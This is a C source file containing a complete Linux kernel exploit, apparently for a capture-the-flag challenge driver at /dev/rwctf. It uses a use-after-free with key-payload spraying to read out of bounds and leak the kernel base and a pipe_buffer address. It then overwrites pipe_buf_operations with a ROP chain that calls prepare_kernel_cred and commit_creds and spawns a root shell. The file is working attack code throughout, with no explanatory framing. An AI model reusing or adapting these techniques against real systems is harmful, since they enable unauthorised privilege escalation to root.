#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdio.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdint.h>

/**
 * Utilities
 */

size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

/* root checker and shell poper */
void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

/**
 * Syscall keyctl() operator
 */

#define KEY_SPEC_PROCESS_KEYRING -2 /* - key ID for process-specific keyring */
#define KEYCTL_UPDATE           2   /* update a key */
#define KEYCTL_REVOKE           3   /* revoke a key */
#define KEYCTL_UNLINK           9   /* unlink a key from a keyring */
#define KEYCTL_READ             11  /* read a key or keyring's contents */

int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/**
 * Challenge interactiver
 */

/* kmalloc-192 has only 21 objects on a slub, we don't need to spray to many */
#define KEY_SPRAY_NUM 40

#define PIPE_INODE_INFO_SZ 192
#define PIPE_BUFFER_SZ 1024

#define USER_FREE_PAYLOAD_RCU 0xffffffff813d8210
#define PREPARE_KERNEL_CRED 0xffffffff81096110
#define COMMIT_CREDS 0xffffffff81095c30
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0

#define PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d
#define POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4
#define POP_RDI_RET 0xffffffff8106ab4d
#define XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70

int dev_fd;

struct node {
    uint32_t idx;
    uint32_t size;
    void *buf;
};

/**
 * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )
 * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM 
 * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS
 * 
 * @param idx 
 * @param size 
 * @param buf 
 */
void alloc(uint32_t idx, uint32_t size, void *buf)
{
    struct node n = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };

    ioctl(dev_fd, 0xDEADBEEF, &n);
}

void del(uint32_t idx)
{
    struct node n = {
        .idx = idx,
    };

    ioctl(dev_fd, 0xC0DECAFE, &n);
}

/**
 * Exploit stage
 */

int main(int argc, char **argv, char **envp)
{
    size_t *buf, pipe_buffer_addr;
    int key_id[KEY_SPRAY_NUM], victim_key_idx = -1, pipe_key_id;
    char desciption[0x100];
    int pipe_fd[2];
    int retval;

    /* fundamental works */
    bind_core(0);
    save_status();

    buf = malloc(sizeof(size_t) * 0x4000);

    dev_fd = open("/dev/rwctf", O_RDONLY);
    if (dev_fd < 0) {
        err_exit("FAILED to open the /dev/rwctf file!");
    }

    /* construct UAF on user_key_payload */
    puts("[*] construct UAF obj and spray keys...");
    alloc(0, PIPE_INODE_INFO_SZ, buf);
    del(0);

    for (int i = 0; i < KEY_SPRAY_NUM; i++) {
        snprintf(desciption, 0x100, "%s%d", "arttnba", i);
        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - 0x18);
        if (key_id[i] < 0) {
            printf("[x] failed to alloc %d key!\n", i);
            err_exit("FAILED to add_key()!");
        }
    }

    del(0);

    /* corrupt user_key_payload's header */
    puts("[*] corrupting user_key_payload...");

    buf[0] = 0;
    buf[1] = 0;
    buf[2] = 0x2000;

    for (int i = 0; i < (KEY_SPRAY_NUM * 2); i++) {
        alloc(0, PIPE_INODE_INFO_SZ, buf);
    }

    /* check for oob-read and leak kernel base */
    puts("[*] try to make an OOB-read...");

    for (int i = 0; i < KEY_SPRAY_NUM; i++) {
        if (key_read(key_id[i], buf, 0x4000) > PIPE_INODE_INFO_SZ) {
            printf("[+] found victim key at idx: %d\n", i);
            victim_key_idx = i;
        } else {
            key_revoke(key_id[i]);
        }
    }

    if (victim_key_idx == -1) {
        err_exit("FAILED at corrupt user_key_payload!");
    }

    kernel_offset = -1;
    for (int i = 0; i < 0x2000 / 8; i++) {
        if (buf[i] > kernel_base && (buf[i] & 0xfff) == 0x210) {
            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;
            kernel_base += kernel_offset;
            break;
        }
    }

    if (kernel_offset == -1) {
        err_exit("FAILED to leak kernel addr!");
    }

    printf("\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n", kernel_offset);
    printf("\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n", kernel_base);

    /* construct UAF on pipe_inode_buffer to leak pipe_buffer's addr */
    puts("[*] construct UAF on pipe_inode_info...");

    /* 0->1->..., the 1 will be the payload object */
    alloc(0, PIPE_INODE_INFO_SZ, buf);
    alloc(1, PIPE_INODE_INFO_SZ, buf);
    del(1);
    del(0);

    pipe_key_id = key_alloc("arttnba3pipe", buf, PIPE_INODE_INFO_SZ - 0x18);
    del(1);

    /* this object is for the pipe buffer */
    alloc(0, PIPE_BUFFER_SZ, buf);
    del(0);

    pipe(pipe_fd);

    /* note that the user_key_payload->datalen is 0xFFFF now */
    retval = key_read(pipe_key_id, buf, 0xffff);
    pipe_buffer_addr = buf[16]; /* pipe_inode_info->bufs */
    printf("\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n", 
            pipe_buffer_addr);

    /* construct fake pipe_buf_operations */
    memset(buf, 'A', sizeof(buf));

    buf[0] = *(size_t*) "arttnba3";
    buf[1] = *(size_t*) "arttnba3";
    buf[2] = pipe_buffer_addr + 0x18;  /* pipe_buffer->ops */
    /* after release(), we got back here */
    buf[3] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;
    /* pipe_buf_operations->release */
    buf[4] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;
    buf[5] = *(size_t*) "arttnba3";
    buf[6] = *(size_t*) "arttnba3";
    buf[7] = kernel_offset + POP_RDI_RET;
    buf[8] = (size_t) NULL;
    buf[9] = kernel_offset + PREPARE_KERNEL_CRED;
    buf[10] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;
    buf[11] = kernel_offset + COMMIT_CREDS;
    buf[12] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x31;
    buf[13] = *(size_t*) "arttnba3";
    buf[14] = *(size_t*) "arttnba3";
    buf[15] = (size_t) get_root_shell;
    buf[16] = user_cs;
    buf[17] = user_rflags;
    buf[18] = user_sp + 8; /* system() wants it : ( */
    buf[19] = user_ss;

    del(0);
    alloc(0, PIPE_BUFFER_SZ, buf);

    /* trigger pipe_buf_operations->release */
    puts("[*] trigerring pipe_buf_operations->release()...");

    close(pipe_fd[1]);
    close(pipe_fd[0]);

    return 0;
}
